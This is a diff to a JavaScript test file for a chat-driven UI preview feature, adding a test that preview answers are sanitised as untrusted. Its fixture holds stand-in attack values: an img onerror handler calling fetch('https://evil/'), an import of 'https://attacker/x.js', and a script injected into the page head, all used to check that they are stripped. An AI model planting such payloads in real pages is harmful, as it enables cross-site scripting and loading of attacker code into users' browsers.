@@ -77,13 +77,26 @@ test('the __preview__ call: current route, consumed as is, NO serverSideType, em
   assert.equal(body.consumedRoute, '/orders')
   assert.equal(body.serverSideType, undefined)
   assert.deepEqual(body.componentState, {})
-  assert.deepEqual(body.parameters, { _yaml: 'type: Page' })
+  assert.deepEqual(body.parameters, { _yaml: 'type: Page', _untrusted: true })
+})
+
+test('NB1: a preview answer is painted UNTRUSTED — no handler, import or markup survives, the rest does', () => {
+  const evil = { type: 'ClientSide', id: 'e', children: [], metadata: { type: 'Element', name: 'img',
+    attributes: { src: 'x.png', onerror: "fetch('https://evil/')", import: 'https://attacker/x.js' }, on: {}, content: '<b>x</b>', html: true } }
+  const answer = { ...preview(evil), commands: [{ type: 'AddContentToHead', data: '<script>1</script>' }, { type: 'SetWindowTitle', data: 'T' }] }
+  for (const target of ['content', 'drawer']) {
+    const inc = chatPreviewIncrementOf(answer, { yaml: 'x', target }, '/r')
+    const text = JSON.stringify(inc)
+    assert.ok(!/onerror|attacker|AddContentToHead/.test(text), target + ': ' + text)
+    assert.ok(text.includes('x.png') && text.includes('SetWindowTitle'), target)
+    assert.ok(text.includes('"html":false'), target)
+  }
 })
 
 test('preview into the CONTENT: the answer replaces the host — painted like any page re-render', () => {
   const inc = chatPreviewIncrementOf(preview(formPage), { target: 'content' })
   const reg = reduceContexts(regWith(), inc)
-  assert.equal(reg.contexts[HOST_ID].tree, formPage)
+  assert.deepEqual(reg.contexts[HOST_ID].tree, formPage)
   assert.equal(reg.contexts[HOST_ID].state.name, 'Ada')
   assert.equal(reg.stack.length, 0, 'no overlay')
 })
@@ -170,9 +183,9 @@ test('dispatch: render-screen with no subscriber POSTs __preview__ to the screen
   const call = host.log.find((l) => l[0] === 'call')
   assert.equal(call[1], 'http://b')
   assert.equal(call[2].route, '/hello')
-  assert.deepEqual(call[2].parameters, { _yaml: 'type: Page' })
+  assert.deepEqual(call[2].parameters, { _yaml: 'type: Page', _untrusted: true })
   const paint = host.log.find((l) => l[0] === 'paint')
-  assert.equal(paint[1].fragments[0].component, formPage)
+  assert.deepEqual(paint[1].fragments[0].component, formPage)
   assert.equal(paint[2].target, 'content')
   assert.ok(!host.log.some((l) => l[0] === 'run'), 'no hard-coded renderScreen action')
   assert.deepEqual(doc.seen.map((s) => s[0]), ['render-screen'])
